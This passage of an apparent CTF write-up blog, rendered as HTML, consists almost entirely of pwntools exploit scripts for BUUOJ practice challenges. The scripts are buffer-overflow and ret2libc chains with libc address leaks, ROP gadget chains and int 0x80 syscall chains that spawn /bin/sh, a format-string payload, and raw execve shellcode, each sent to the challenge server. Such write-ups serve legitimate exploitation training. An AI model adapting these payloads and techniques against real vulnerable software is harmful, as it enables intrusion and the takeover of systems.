class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">25708</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.4\")</span></span><br><span class=\"line\">x = <span class=\"number\">0x0804A02C</span></span><br><span class=\"line\">pld = fmtstr_payload(<span class=\"number\">11</span>,&#123;x:<span class=\"number\">4</span>&#125;)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"jarvisoj-tell-me-something\"><a href=\"#jarvisoj-tell-me-something\" class=\"headerlink\" title=\"jarvisoj_tell_me_something\"></a>jarvisoj_tell_me_something</h2><p> ida</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">25781</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.3\")</span></span><br><span class=\"line\">back = <span class=\"number\">0x0400620</span></span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x88</span>)+p64(back)</span><br><span class=\"line\">ru(<span class=\"string\">\"Input your message:\\n\"</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"jarvisoj-level4\"><a href=\"#jarvisoj-level4\" class=\"headerlink\" title=\"jarvisoj_level4\"></a>jarvisoj_level4</h2><p>32write</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">28988</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.3\")</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.6\"</span>)</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">write_plt = elf.sym[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">main = elf.sym[<span class=\"string\">\"main\"</span>]</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x88</span>+<span class=\"number\">0x4</span>)+p32(write_plt)+p32(main)+p32(<span class=\"number\">1</span>)+p32(write_got)+p32(<span class=\"number\">4</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">write = uu32(r(<span class=\"number\">4</span>))</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"./libc-2.231.so\"</span>)</span><br><span class=\"line\">libc_base = write-libc.sym[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">sys = libc_base+libc.sym[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">sh = libc_base+next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\">leak(<span class=\"string\">\"libc\"</span>,libc_base)</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x88</span>+<span class=\"number\">0x4</span>)+p32(sys)+p32(<span class=\"number\">0</span>)+p32(sh)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"bjdctf-2020-babystack2\"><a href=\"#bjdctf-2020-babystack2\" class=\"headerlink\" title=\"bjdctf_2020_babystack2\"></a>bjdctf_2020_babystack2</h2><p></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29933</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.3\")</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.6\"</span>)</span><br><span class=\"line\">back = <span class=\"number\">0x400726</span></span><br><span class=\"line\">ru(<span class=\"string\">\"[+]Please input the length of your name:\\n\"</span>)</span><br><span class=\"line\">sl(<span class=\"string\">\"2415919104\"</span>)</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x10</span>+<span class=\"number\">0x08</span>)+p64(back)</span><br><span class=\"line\">print(r())</span><br><span class=\"line\"><span class=\"comment\">#sleep(1)</span></span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"jarvisoj-level3-x64\"><a href=\"#jarvisoj-level3-x64\" class=\"headerlink\" title=\"jarvisoj_level3_x64\"></a>jarvisoj_level3_x64</h2><p>64write</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#import binascii</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">26477</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.8\",env =&#123;\"LD_PRELOAD\":\"./libc-2.232.so\"&#125;)</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x00000000004006b3</span></span><br><span class=\"line\">pop_rsi_pop_r15 = <span class=\"number\">0x00000000004006b1</span></span><br><span class=\"line\">ret = <span class=\"number\">0x0000000000400499</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.8\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(\"./libc-2.232.so\")</span></span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">write_plt = elf.plt[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">main = elf.sym[<span class=\"string\">'main'</span>]</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x80</span>+<span class=\"number\">0x8</span>)+p64(pop_rdi)+p64(<span class=\"number\">1</span>)+p64(pop_rsi_pop_r15)+p64(write_got)+p64(<span class=\"number\">0</span>)+p64(write_plt)+p64(main)</span><br><span class=\"line\">ru(<span class=\"string\">\"Input:\\n\"</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">write = uu64(r(<span class=\"number\">6</span>))</span><br><span class=\"line\"><span class=\"comment\"># libc_base = write - libc.sym[\"write\"]</span></span><br><span class=\"line\"><span class=\"comment\"># leak(\"libc\",libc_base)</span></span><br><span class=\"line\"><span class=\"comment\"># sys = libc_base + libc.sym[\"system\"]</span></span><br><span class=\"line\"><span class=\"comment\"># sh = libc_base + next(libc.search(\"/bin/sh\"))</span></span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">'write'</span>,write)</span><br><span class=\"line\">libc_base = write - libc.dump(<span class=\"string\">'write'</span>)</span><br><span class=\"line\">leak(<span class=\"string\">\"libc\"</span>,libc_base)</span><br><span class=\"line\">sys = libc_base + libc.dump(<span class=\"string\">'system'</span>)</span><br><span class=\"line\">sh = libc_base + libc.dump(<span class=\"string\">'str_bin_sh'</span>)</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x80</span>+<span class=\"number\">0x8</span>)+p64(pop_rdi)+p64(sh)+p64(sys)</span><br><span class=\"line\">ru(<span class=\"string\">\"Input:\\n\"</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"picoctf-2018-rop-chain\"><a href=\"#picoctf-2018-rop-chain\" class=\"headerlink\" title=\"picoctf_2018_rop chain\"></a>picoctf_2018_rop chain</h2><p></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#import binascii</span></span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.9\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">25351</span>)</span><br><span class=\"line\">win1 = <span class=\"number\">0x080485CB</span></span><br><span class=\"line\">win2 = <span class=\"number\">0x080485D8</span></span><br><span class=\"line\">flag = <span class=\"number\">0x0804862B</span></span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x18</span>+<span class=\"number\">0x4</span>)+p32(win1)+p32(win2)+p32(flag)+<span class=\"string\">b\"\\xAD\\xAA\\xAA\\xBA\"</span>+<span class=\"string\">b\"\\xAD\\xBA\\xAD\\xDE\"</span></span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"jarvisoj-test-your-memory\"><a href=\"#jarvisoj-test-your-memory\" class=\"headerlink\" title=\"jarvisoj_test_your_memory\"></a>jarvisoj_test_your_memory</h2><blockquote>\n<p></p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.11\")</span></span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(\"./libc-2.232.so\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">28866</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.12\"</span>)</span><br><span class=\"line\">cat = <span class=\"number\">0x080487E0</span></span><br><span class=\"line\">sys = <span class=\"number\">0x08048440</span></span><br><span class=\"line\">sys_addr=elf.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*<span class=\"number\">0x17</span>+p32(sys)+p32(<span class=\"number\">0x8048677</span>)+p32(cat)</span><br><span class=\"line\">print(pld)</span><br><span class=\"line\">s(pld)</span><br><span class=\"line\">ru(<span class=\"string\">\"&gt;\"</span>)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"bjdctf-2020-router\"><a href=\"#bjdctf-2020-router\" class=\"headerlink\" title=\"bjdctf_2020_router\"></a>bjdctf_2020_router</h2><p></p>\n<h2 id=\"picoctf-2018-buffer-overflow-1\"><a href=\"#picoctf-2018-buffer-overflow-1\" class=\"headerlink\" title=\"picoctf_2018_buffer overflow 1\"></a>picoctf_2018_buffer overflow 1</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29603</span>)</span><br><span class=\"line\">shellcode = <span class=\"string\">\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"</span></span><br><span class=\"line\">pld = shellcode.ljust(<span class=\"number\">0x28</span>+<span class=\"number\">4</span>,<span class=\"string\">'A'</span>)+p32(<span class=\"number\">0x080485CB</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"ZJCTF-2019-Login\"><a href=\"#ZJCTF-2019-Login\" class=\"headerlink\" title=\"[ZJCTF 2019]Login\"></a>[ZJCTF 2019]Login</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.18\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">25296</span>)</span><br><span class=\"line\">ru(<span class=\"string\">\"Please enter username: \"</span>)</span><br><span class=\"line\">sl(<span class=\"string\">\"admin\"</span>)</span><br><span class=\"line\">ru(<span class=\"string\">\"Please enter password: \"</span>)</span><br><span class=\"line\">sl(<span class=\"string\">b'2jctf_pa5sw0rd'</span>.ljust(<span class=\"number\">0x48</span>, <span class=\"string\">b'\\x00'</span>) + p64(<span class=\"number\">0x400e88</span>))</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"cmcc-simplerop\"><a href=\"#cmcc-simplerop\" class=\"headerlink\" title=\"cmcc_simplerop\"></a>cmcc_simplerop</h2><p>1.bss32</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.19\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">26841</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.19\"</span>)</span><br><span class=\"line\">int = <span class=\"number\">0x080493e1</span></span><br><span class=\"line\">pop_eax = <span class=\"number\">0x080bae06</span></span><br><span class=\"line\">pop_ebx = <span class=\"number\">0x080481c9</span></span><br><span class=\"line\">pop_ecx_ebx = <span class=\"number\">0x0806e851</span></span><br><span class=\"line\">pop_edx = <span class=\"number\">0x0806e82a</span></span><br><span class=\"line\">pop_edx_ecx_ebx = <span class=\"number\">0x0806e850</span></span><br><span class=\"line\">read = elf.sym[<span class=\"string\">\"read\"</span>]</span><br><span class=\"line\">bss = elf.bss()</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x20</span>)+p32(read)+p32(pop_edx_ecx_ebx)+p32(<span class=\"number\">0</span>)+p32(bss)+p32(<span class=\"number\">8</span>)</span><br><span class=\"line\">pld += p32(pop_eax)+p32(<span class=\"number\">0xb</span>)+p32(pop_edx_ecx_ebx)+p32(<span class=\"number\">0</span>)+p32(<span class=\"number\">0</span>)+p32(bss)+p32(int)</span><br><span class=\"line\">ru(<span class=\"string\">\"Your input :\"</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">s(<span class=\"string\">\"/bin/sh\\x00\"</span>)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<p>2.mprotect</p>\n<blockquote>\n<p><strong>mprotect()</strong>startlenprot</p>\n<p>shellcodebssshellcodemprotectbss</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span 